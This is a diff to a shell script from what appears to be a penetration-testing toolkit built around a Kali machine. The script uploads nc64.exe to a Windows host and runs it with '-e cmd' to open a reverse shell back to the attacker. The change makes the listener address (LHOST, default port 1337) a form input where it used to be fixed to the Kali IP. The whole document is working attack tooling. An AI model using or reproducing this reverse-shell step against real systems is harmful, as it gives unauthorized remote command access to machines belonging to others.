@@ -4,19 +4,21 @@
 upload nc64.exe and start nc64.exe and execute cmd
 '
 
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+LHOST_FIELD=$(form_item  "LHOST" "number" "lhost" "${KALI_IP}")
+PORT_FIELD=$(form_item  "port" "number" "port" "1337")
+
+# Generate GUI form
+generate_form "${LHOST_FIELD}" "${PORT_FIELD}"
+
+LHOST=${form_data["lhost"]}
+PORT=${form_data["port"]}
+
 LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
 FILE="nc64.exe"
 EXECUTE_COMMAND="cmd"
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 
-# Generate GUI form items (label, type (optional: default text), name, default (optional))
-PORT_FIELD=$(form_item  "port" "number" "port" "1337")
-
-# Generate GUI form
-generate_form "${PORT_FIELD}"
-
-PORT=${form_data["port"]}
-
-execute_command "${FILE_LOCATION} ${KALI_IP} ${PORT} -e ${EXECUTE_COMMAND}"
+execute_command "${FILE_LOCATION} ${LHOST} ${PORT} -e ${EXECUTE_COMMAND}"
 create_new_line
